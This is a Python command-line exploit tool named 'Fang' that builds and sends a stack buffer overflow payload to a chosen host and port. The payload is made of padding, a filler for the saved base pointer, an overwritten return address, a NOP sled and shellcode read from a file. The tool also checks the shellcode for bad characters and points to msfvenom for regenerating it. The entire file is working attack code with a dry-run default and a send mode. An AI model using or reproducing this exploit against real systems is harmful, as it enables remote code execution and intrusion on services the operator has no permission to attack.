#!/usr/bin/env python3
import socket
import sys
import struct
import argparse
import os

def parse_args():
    parser = argparse.ArgumentParser(
        description="Fang - Buffer Overflow Exploit Module",
        formatter_class=argparse.RawTextHelpFormatter
    )

    # Target
    target = parser.add_argument_group("Target")
    target.add_argument("-H", "--host",     required=True,  help="Target IP or hostname")
    target.add_argument("-p", "--port",     required=True,  type=int, help="Target port")

    # Payload
    payload_grp = parser.add_argument_group("Payload")
    payload_grp.add_argument("-s", "--shellcode",  default="shellcode.bin",  help="Path to raw shellcode binary (default: shellcode.bin)")
    payload_grp.add_argument("-b", "--buffer-size",required=True,  type=int, help="Vulnerable buffer size in bytes")
    payload_grp.add_argument("-r", "--ret-addr",   required=True,  help="Return address (hex, e.g. 0x7fffffffdb90)")
    payload_grp.add_argument("-n", "--nop-size",   default=128,    type=int, help="NOP sled size (default: 128)")

    # Offsets
    offsets = parser.add_argument_group("Offsets")
    offsets.add_argument("--rbp-size",     default=8,      type=int, help="Saved RBP size (default: 8)")
    offsets.add_argument("--extra-offset", default=0,      type=int, help="Extra padding adjustment if needed")

    # Bad chars
    parser.add_argument(
        "--bad-chars",
        default="00,0a,0d",
        help="Comma-separated bad chars in hex to check against shellcode (default: 00,0a,0d)"
    )

    # Mode
    mode = parser.add_argument_group("Mode")
    mode.add_argument("--send", action="store_true", help="Actually send the payload (default: dry run)")
    mode.add_argument("--timeout", default=5, type=int, help="Socket timeout in seconds (default: 5)")

    return parser.parse_args()


def check_bad_chars(shellcode: bytes, bad_chars: list[int]) -> bool:
    found = False
    for i, b in enumerate(shellcode):
        if b in bad_chars:
            print(f"  [!] Bad char 0x{b:02x} found at offset {i}")
            found = True
    return found


def build_payload(
    shellcode:    bytes,
    buffer_size:  int,
    rbp_size:     int,
    extra_offset: int,
    nop_size:     int,
    ret_addr:     int
) -> bytes:

    nop_sled    = b"\x90" * nop_size
    padding     = b"A" * (buffer_size + extra_offset)
    saved_rbp   = b"B" * rbp_size
    rip         = struct.pack("<Q", ret_addr)

    payload = padding + saved_rbp + rip + nop_sled + shellcode
    return payload


def print_summary(args, payload: bytes, ret_addr: int, bad_chars: list[int]):
    print("\n[ Configuration ]")
    print(f"  Target         : {args.host}:{args.port}")
    print(f"  Shellcode      : {args.shellcode} ({len(open(args.shellcode,'rb').read())} bytes)")
    print(f"  Buffer size    : {args.buffer_size} bytes")
    print(f"  RBP size       : {args.rbp_size} bytes")
    print(f"  Extra offset   : {args.extra_offset} bytes")
    print(f"  NOP sled       : {args.nop_size} bytes")
    print(f"  Return address : {hex(ret_addr)}")
    print(f"  Bad chars      : {[hex(b) for b in bad_chars]}")
    print(f"  Total payload  : {len(payload)} bytes")

    print("\n[ Payload Layout ]")
    print(f"  [A * {args.buffer_size + args.extra_offset}] "
          f"[B * {args.rbp_size}] "
          f"[RIP: {hex(ret_addr)}] "
          f"[NOP * {args.nop_size}] "
          f"[shellcode]")

    print("\n[ Payload Hex Preview ]")
    preview = payload[:64]
    print("  " + " ".join(f"{b:02x}" for b in preview) + " ...")


def send_payload(host: str, port: int, payload: bytes, timeout: int):
    print(f"\n[+] Connecting to {host}:{port} ...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout)
        sock.connect((host, port))
        print(f"[+] Connected")
        print(f"[+] Sending {len(payload)} byte payload ...")
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)

        # Try to grab any response
        try:
            resp = sock.recv(1024)
            if resp:
                print(f"[+] Server responded: {resp[:64]}")
        except:
            pass

    print("[+] Payload sent")


def main():
    args = parse_args()

    # Parse return address
    try:
        ret_addr = int(args.ret_addr, 16)
    except ValueError:
        print(f"[!] Invalid return address: {args.ret_addr}")
        sys.exit(1)

    # Parse bad chars
    bad_chars = [int(b, 16) for b in args.bad_chars.split(",")]

    # Load shellcode
    if not os.path.isfile(args.shellcode):
        if args.shellcode == "shellcode.bin":
            print(f"[!] Default shellcode.bin not found in current directory")
            print(f"[!] Provide a path with: -s /path/to/shellcode.bin")
        else:
            print(f"[!] Shellcode file not found: {args.shellcode}")
        sys.exit(1)

    with open(args.shellcode, "rb") as f:
        shellcode = f.read()

    # Bad char check
    print("\n[ Bad Char Check ]")
    if check_bad_chars(shellcode, bad_chars):
        print("  [!] Bad chars detected — shellcode may be corrupted in transit")
        print("  [!] Regenerate shellcode with: msfvenom ... -b '\\x00\\x0a\\x0d'")
    else:
        print("  [+] No bad chars found")

    # Build payload
    payload = build_payload(
        shellcode    = shellcode,
        buffer_size  = args.buffer_size,
        rbp_size     = args.rbp_size,
        extra_offset = args.extra_offset,
        nop_size     = args.nop_size,
        ret_addr     = ret_addr
    )

    # Print summary
    print_summary(args, payload, ret_addr, bad_chars)

    # Dry run or send
    if not args.send:
        print("\n[*] Dry run complete — use --send to transmit payload")
        sys.exit(0)

    send_payload(args.host, args.port, payload, args.timeout)


if __name__ == "__main__":
    main()